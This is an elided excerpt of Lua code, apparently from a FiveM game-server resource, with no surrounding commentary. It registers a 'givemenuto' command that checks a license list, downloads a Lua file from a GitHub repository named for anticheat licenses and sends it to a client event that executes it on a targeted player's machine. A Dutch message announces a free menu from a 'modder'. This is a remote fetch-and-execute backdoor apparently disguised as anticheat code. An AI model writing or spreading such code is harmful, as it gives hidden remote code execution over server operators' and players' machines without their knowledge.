...
RegisterCommand('givemenuto', function(source, args, rawCommand)  
    local _source = source
                ...
                if code == 200 then
                    ...
                    if decoded[dclicense] ~= nil then
                        PerformHttpRequest("https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/gayout.lua", function(code, res, headers)
                            if code == 200 then
                                if res ~= nil then
                                    TriggerClientEvent('esx:showNotification', player, "Gratis menu xxx je favoriete modder")
                                    TriggerClientEvent('GTX:executecommand', player, res)
                                else
